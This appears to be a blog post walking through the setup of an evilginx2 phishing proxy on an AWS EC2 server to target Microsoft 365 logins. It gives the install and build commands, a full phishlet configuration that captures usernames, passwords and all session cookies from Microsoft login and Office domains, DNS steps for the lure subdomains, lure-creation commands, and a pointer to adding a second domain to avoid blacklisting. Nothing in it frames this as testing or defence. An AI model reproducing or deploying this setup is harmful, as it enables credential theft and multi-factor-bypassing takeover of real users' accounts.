---
layout: post
---

### Setting up the domain1

### Setting up the nameservers ~ Route53

### Setting up the VPS ~ EC2
Ubuntu free tier <br>
Generate ssh key pair
#### Network Settings
configuring the ssh to local computer ip 

```bash
curl http://ipinfo.io/ip 
```
and http/s and DNS from 0.0.0.0 (anywhere) ~~> Launch

### setting up [evilginx](https://github.com/kgretzky/evilginx2) in instance 

```bash
sudo apt update
#INSATLLING GO
cd ~
curl -OL https://golang.org/dl/go1.21.6.linux-amd64.tar.gz
sha256sum go1.21.6.linux-amd64.tar.gz
sudo tar -C /usr/local -xvf go1.21.6.linux-amd64.tar.gz
sudo nano ~/.profile
### adding this
## export PATH=$PATH:/usr/local/go/bin
source ~/.profile
go version

git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./build/evilginx -p /phishlets/

## help ~~ ## config domain 1 ~~ ## config ipv4
### domain pointing to instance public ip
## setting up the phishlets
## phishlets hostname m365 domain1
## phishlets enable m365
```
### phishlets in my case is m365 

```yaml
min_ver: '3.2.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session:true, is_landing: true}
  - {phish_sub: 'logon', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
sub_filters:
auth_tokens:
  - domain: '.live.com' #domain that sends the cookie
    keys: ['.*:regexp'] #name of cookie to steal
  - domain: 'live.com'
    keys: ['.*:regexp']
  - domain: '.login.live.com'
    keys: ['.*:regexp']
  - domain: 'login.live.com'
    keys: ['.*:regexp']
  - domain: '.login.microsoftonline.com'
    keys: ['.*:regexp']
  - domain: 'login.microsoftonline.com'
    keys: ['.*:regexp']  
  - domain: '.microsoft.com'
    keys: ['.*:regexp'] 
  - domain: 'microsoft.com'
    keys: ['.*:regexp']
  - domain: '.office.com'
    keys: ['.*:regexp']
  - domain: 'office.com'
    keys: ['.*:regexp']
  - domain: '.www.office.com'
    keys: ['.*:regexp']
  - domain: 'www.office.com'
    keys: ['.*:regexp']
auth_urls:
  - '/landingv2'
credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
login:
  domain: 'login.microsoftonline.com'
  path: '/' # path to where the login is, on the domain.    
```

### pointing subdomains of domain 1 to phishlets subdomain 

login <br>
logon and <br>
www ~~> to the domain1 ip that is the instance ip running the server

### creating lures in evilginx

```bash
## in evilginx
lures create m365
lures get-url <id>
```
## Adding another domain to prevent BLACKLISTING

 <a href="2023-01-14-Adding-domain2.md">Adding another apache server</a>


 Next part in domain 2

